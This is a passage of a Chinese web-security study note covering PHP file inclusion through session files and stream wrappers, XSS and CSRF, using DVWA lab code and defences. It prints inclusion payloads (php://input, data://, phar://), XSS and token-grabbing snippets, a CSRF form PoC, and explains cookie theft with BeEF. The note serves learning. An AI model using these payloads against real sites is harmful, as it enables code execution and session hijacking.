<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="variable">$username</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>输入<code>username</code>会记录<code>Session</code>，以序列化的形式存在，可以在<code>php.ini</code>中找到相关的保存路径</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601202513684.png" alt="image-20220601202513684"></p>
<p>那么访问即可获得<code>Session</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601202712181.png" alt="image-20220601202712181"></p>
<p>这样就可以尝试将该文件使用文件包含的形式来执行代码。</p>

        <h3 id="4-伪协议"   >
          <a href="#4-伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-伪协议" class="headerlink" title="(4)伪协议"></a>(4)伪协议</h3>
      <p>使用伪协议可以访问<code>PHP</code>的相关文件描述符，从而进行读取解析文件。</p>

        <h4 id="①使用例子"   >
          <a href="#①使用例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#①使用例子" class="headerlink" title="①使用例子"></a>①使用例子</h4>
      <p>比如有时候直接文件包含不能够打印结果，比如说某个<code>test.php</code>，内容如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;aaaa&quot;</span>;</span><br><span class="line">	<span class="comment">//flag&#123;cccc&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>那么当<code>include</code>文件包含进入之后，解析<code>PHP</code>代码，只会输出<code>aaaa</code>，而不会输出<code>flag&#123;cccc&#125;</code>的内容，这时候就需要用到伪协议<code>php://filert</code>来将文件流包含进来，这样就会打印出<code>test.php</code>文件了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210615644.png" alt="image-20220601210615644"></p>
<p>使用伪协议：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210629504.png" alt="image-20220601210629504"></p>
<p><code>Burpsuite</code>解码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210654804.png" alt="image-20220601210654804"></p>

        <h4 id="②各种伪协议"   >
          <a href="#②各种伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#②各种伪协议" class="headerlink" title="②各种伪协议"></a>②各种伪协议</h4>
      <ul>
<li><p><code>php://filter</code></p>
<p>通常用来读取文件</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off/on</span><br><span class="line">allow_url_include=off/on</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>POC</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=test.php</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p><code>php://input</code></p>
<p>将<code>POST</code>请求的相关数据当作一个文件流输入进去，配合文件包含通常可以执行任意命令。</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off/on</span><br><span class="line">allow_url_include=on</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>POC</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input</span><br><span class="line">[POST DATA]&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p><code>zip://</code></p>
<p>访问压缩包里的文件，访问到的文件结合文件包含函数就会被当作<code>php</code>文件执行，从而实现任意代码执行。</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off/on</span><br><span class="line">allow_url_include=off/on</span><br><span class="line">php &gt;= 5.2</span><br></pre></td></tr></table></div></figure>

<p>需要注意的是只要是压缩包即可，后缀名无所谓。相同类型的还要<code>zlib://</code>和<code>bzip2://</code></p>
</li>
<li><p><code>POC</code>：</p>
<p><code>#</code>需要进行<code>URL</code>编码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip://[压缩包绝对路径]#[压缩包内文件]</span><br><span class="line">?file=zip://D:\phpstudy_pro\WWW\test.zip%23test.php</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p><code>phar://</code></p>
<p><code>phar</code>是用来打包生成<code>php</code>项目用的，可以用相关协议进行解析，其中涉及到很多东西，比较常见的就是<code>zip</code>打包访问以及序列化、反序列的东西。</p>
<p>类似<code>zip://</code>，可以访问<code>zip</code>中的文件，并且相对路径和绝对路径都可以。</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off/on</span><br><span class="line">allow_url_include=off/on</span><br><span class="line">php &gt;= 5.3</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>POC</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://zip.jpg/phpinfo.txt</span><br><span class="line">?file=phar://D:\zip.jpg\phpinfo.txt</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p><code>data://</code></p>
<p>类似于<code>php://input</code>，让用户控制文件的输入流。</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line">allow_url_include=on</span><br><span class="line">php &gt;= 5.2</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>POC</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data://[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;</span><br><span class="line">?file=data://,&lt;?php phpinfo();</span><br><span class="line">?file=data://text/plain,&lt;?php phpinfo();</span><br><span class="line">?file=data://text/plain;base64,[content]</span><br><span class="line">?file=data:text/plain,&lt;?php phpinfo();</span><br><span class="line">?file=data:text/plain;base64,[content]</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h3 id="5-防御"   >
          <a href="#5-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-防御" class="headerlink" title="(5)防御"></a>(5)防御</h3>
      <ul>
<li><code>allow_url_include</code>和<code>allow_url_fopen</code>最小权限化</li>
<li>设置<code>open_basedir</code>将<code>php</code>所能打开的文件限制在指定的目录树中</li>
<li>白名单限制包含文件，或者严格过滤<code>./\</code></li>
</ul>

        <h2 id="漏洞SQL注入"   >
          <a href="#漏洞SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞SQL注入" class="headerlink" title="漏洞SQL注入"></a>漏洞SQL注入</h2>
      <p>了解基本原理，各种利用方式，盲注，时间盲注，布尔盲注，堆叠注入之类的，也差不多会，但是种类太多啦。而且感觉这种类型，工具比实际的感觉会好用一些。此外由于现今数据库很多都开始使用模型来获取制造SQL语句，很难利用了，所以笔记就没有怎么记录。</p>

        <h2 id="漏洞XSS"   >
          <a href="#漏洞XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞XSS" class="headerlink" title="漏洞XSS"></a>漏洞XSS</h2>
      <p>跨站脚本(<code>Cross Site Scripting</code>)攻击，为了不和<code>CSS</code>产生歧义，所以缩写为<code>XSS</code>。</p>
<p>攻击者可以在页面插入恶意脚本（<code>JavaScript</code>）代码，受害者访问页面时，浏览器解析执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。</p>
<p><code>XSS</code>即注入<code>HTML</code>代码</p>

        <h3 id="1-种类"   >
          <a href="#1-种类" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-种类" class="headerlink" title="(1)种类"></a>(1)种类</h3>
      
        <h4 id="①存储型"   >
          <a href="#①存储型" class="heading-link"><i class="fas fa-link"></i></a><a href="#①存储型" class="headerlink" title="①存储型"></a>①存储型</h4>
      <p>较为持久，一般在留言板、用户发帖、用户回帖的版块中，一般类似如下三步：</p>
<ul>
<li>插入留言：恶意代码数据存储到数据库中</li>
<li>查看留言：恶意代码数据从数据库中提取出来</li>
<li>内容在页面显示</li>
</ul>
<p><code>DVWA</code>的<code>Low Security</code>版本代码如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="comment">//基本没有过滤</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="comment">//插入到数据库中</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>那么就直接将恶意代码插入了数据库，不同的<code>DVWA Security</code>如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104504618.png" alt="image-20220609104504618"></p>
<p>之后在解析的时候</p>
<p>没有过滤的直接解析为<code>HTML</code>代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104554318.png" alt="image-20220609104554318"></p>
<p>过滤的信息被解析为相关的字符串</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104633495.png" alt="image-20220609104633495"></p>

        <h4 id="②反射型"   >
          <a href="#②反射型" class="heading-link"><i class="fas fa-link"></i></a><a href="#②反射型" class="headerlink" title="②反射型"></a>②反射型</h4>
      <p>插入的数据不存储和读取数据库，直接回显到页面上，通常需要诱导用户去点击触发漏洞的地方。</p>
<p><code>DVWA</code>的<code>Low Security</code>版本代码如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="comment">//获取输入然后拼接字符串直接作为HTML代码输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>浏览器中解析如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609105153708.png" alt="image-20220609105153708"></p>

        <h4 id="③DOM型"   >
          <a href="#③DOM型" class="heading-link"><i class="fas fa-link"></i></a><a href="#③DOM型" class="headerlink" title="③DOM型"></a>③DOM型</h4>
      <p>比较少见，通过修改页面中的DOM节点，与客户端上的<code>JavaScript</code>进行交互，不会与服务端进行交互，通常是<code>document.write</code>函数</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line">	<span class="comment">//直接获取并且拼接，然后就document.write来写到整个HTML页面中</span></span><br><span class="line">	<span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line">	<span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>没有写入其他的如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609140222567.png" alt="image-20220609140222567"></p>
<p>当从URL加入其他的拼接字符，其结构点发生变化，写入了我们的<code>JS</code>代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609140308956.png" alt="image-20220609140308956"></p>

        <h3 id="2-危害攻击"   >
          <a href="#2-危害攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-危害攻击" class="headerlink" title="(2)危害攻击"></a>(2)危害攻击</h3>
      <ul>
<li>钓鱼，可以伪造登录框和页面</li>
<li>Cookie盗取</li>
<li>获取IP</li>
<li>站点重定向</li>
<li><code>BOM/DOM</code>的操作</li>
<li>获取客户端的页面信息，比如窃取邮件内容</li>
<li><code>XSS</code>蠕虫，可以自我传播</li>
</ul>

        <h3 id="3-挖掘"   >
          <a href="#3-挖掘" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-挖掘" class="headerlink" title="(3)挖掘"></a>(3)挖掘</h3>
      <p>输入输出点，有的转义、过滤、消毒的等需要处理</p>

        <h3 id="4-触发漏洞"   >
          <a href="#4-触发漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-触发漏洞" class="headerlink" title="(4)触发漏洞"></a>(4)触发漏洞</h3>
      <ul>
<li><p>在<code>script</code>标签插入</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>在事件中插入</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">javascript:alert(1);</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>在该方式下，<code>src</code>读取不到资源，就会触发后面的<code>javascript</code>代码，即<code>alert(1)</code></p>
</li>
<li><p>在协议中插入</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1);&quot;</span>&gt;</span>点此查看链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>点击这里就会跳转<code>href</code>中进行执行<code>javascript</code>代码</p>
</li>
<li><p>等等</p>
</li>
</ul>

        <h3 id="▲XSS的Payload大全："   >
          <a href="#▲XSS的Payload大全：" class="heading-link"><i class="fas fa-link"></i></a><a href="#▲XSS的Payload大全：" class="headerlink" title="▲XSS的Payload大全："></a>▲XSS的Payload大全：</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" >Cross-Site Scripting (XSS) Cheat Sheet - 2022 Edition | Web Security Academy (portswigger.net)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="▲XSS的题目大全"   >
          <a href="#▲XSS的题目大全" class="heading-link"><i class="fas fa-link"></i></a><a href="#▲XSS的题目大全" class="headerlink" title="▲XSS的题目大全"></a>▲XSS的题目大全</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xss.haozi.me/#/0x00" >alert(1) (haozi.me)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="5-XSS攻击平台"   >
          <a href="#5-XSS攻击平台" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-XSS攻击平台" class="headerlink" title="(5)XSS攻击平台"></a>(5)XSS攻击平台</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/firesunCN/BlueLotus_XSSReceiver" >firesunCN/BlueLotus_XSSReceiver (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，这个通常用来自定义<code>payload</code>，然后进行上线</p>
<p><code>Kali</code>下的<code>Beef</code>，有很多的模块，社工弹窗等，还挺全</p>

        <h3 id="Cookie盗取"   >
          <a href="#Cookie盗取" class="heading-link"><i class="fas fa-link"></i></a><a href="#Cookie盗取" class="headerlink" title="Cookie盗取"></a>Cookie盗取</h3>
      <p>使用<code>beef</code>的<code>hook.js</code>使得客户端执行恶意的<code>JS</code>代码后，会在<code>beef</code>中收到一些信息，其中就可以提取相关网站的<code>cookie</code>，之后使用无痕模式，将<code>Cookie</code>在<code>F12-&gt;App-&gt;Cookie-&gt;对应网站</code>下，修改填入相关盗取的<code>Cookie</code>即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609173011737.png" alt="image-20220609173011737"></p>

        <h3 id="6-防御"   >
          <a href="#6-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-防御" class="headerlink" title="(6)防御"></a>(6)防御</h3>
      
        <h4 id="①代码防御"   >
          <a href="#①代码防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#①代码防御" class="headerlink" title="①代码防御"></a>①代码防御</h4>
      <p>在服务器的输入输出处理的时候使用过滤、编码、转移之类的，或者<code>HttpOnly</code>头来禁止<code>JS</code>代码读取<code>Cookie</code>。</p>

        <h4 id="②安全设备"   >
          <a href="#②安全设备" class="heading-link"><i class="fas fa-link"></i></a><a href="#②安全设备" class="headerlink" title="②安全设备"></a>②安全设备</h4>
      <p><code>WAF</code>和<code>IDS</code></p>

        <h4 id="③控制客户端输入规则"   >
          <a href="#③控制客户端输入规则" class="heading-link"><i class="fas fa-link"></i></a><a href="#③控制客户端输入规则" class="headerlink" title="③控制客户端输入规则"></a>③控制客户端输入规则</h4>
      <p>检测相关的输入</p>

        <h2 id="漏洞CSRF"   >
          <a href="#漏洞CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞CSRF" class="headerlink" title="漏洞CSRF"></a>漏洞CSRF</h2>
      <p>CSRF（<code>Cross Site Request Forgery</code>），跨站点伪造请求。即攻击者在用户已经登录目标网站之后，诱导用户访问一个攻击者制造的攻击页面，利用用户身份对目标网站发起伪造用户身份操作的请求，相当于伪造用户。这个过程中没有盗取<code>Cookie</code>而是直接利用用户的<code>Cookie</code>来达到伪造用户身份的目的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220610150042385.png" alt="image-20220610150042385"></p>

        <h3 id="1-种类-1"   >
          <a href="#1-种类-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-种类-1" class="headerlink" title="(1)种类"></a>(1)种类</h3>
      
        <h4 id="GET型"   >
          <a href="#GET型" class="heading-link"><i class="fas fa-link"></i></a><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h4>
      <ul>
<li><p>无保护情况</p>
<p>当只需要进行<code>URL</code>提交即可完成功能，即只需要<code>GET</code>请求就能完成时。</p>
<p>如下，只是利用该<code>URL</code>传入参数，结合<code>Cookie</code>即可完成修改密码操作的时候。</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span></span><br></pre></td></tr></table></div></figure>

<p>这种情况就直接伪造一个链接，诱导用户点击该链接，从而触发一个目标网站</p>
</li>
<li><p>有<code>Referer</code></p>
<p>在<code>Medium</code>版本下的加了一行代码</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( stripos( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> )</span><br></pre></td></tr></table></div></figure>

<p>即检测<code>Referer</code>是否是服务器本身，<code>SERVER_NAME</code>表示运行脚本所在服务器的主机名。（如果只是浏览器输入<code>URL</code>访问的话，其<code>Referer</code>字段为空，链接的话则不会，会保存来源网站）</p>
<p>所以这里我们就需要进行抓包伪造<code>Referer</code>字段。</p>
</li>
<li><p>有<code>token</code></p>
<p>在<code>High</code>版本下添加了</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">checkToken( <span class="variable">$token</span>, <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"><span class="comment">//......</span></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br></pre></td></tr></table></div></figure>

<p>会检测用户传入的<code>token</code>，这是一个随机值，每次网站检测完之后会重新生成，然后将新的<code>token</code>发还给用户。</p>
<p>通常这种情况需要结合其他漏洞，比如<code>XSS</code>来获取相关的<code>token</code>值，即变成了<code>XSRF</code>。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#x27; user. token&#x27;)[0].value</span><br></pre></td></tr></table></div></figure>

<p>即加载当前的<code>csrf</code>这个界面时，会弹出<code>token</code>值。当然，结合其他的手法可以直接获取<code>token</code>然后来伪造链接。</p>
</li>
</ul>

        <h4 id="POST型"   >
          <a href="#POST型" class="heading-link"><i class="fas fa-link"></i></a><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h4>
      <p>需要构造<code>POC</code>，在<code>Burp suite</code>中可以<code>右键-&gt;Engagement tools-&gt;Generate CSRF Poc</code>，这样可以生成一个<code>form</code>表单形式来发生<code>POST</code>请求，对应修改相关字段即可。</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://www.baidu.com/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;PIG-007&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        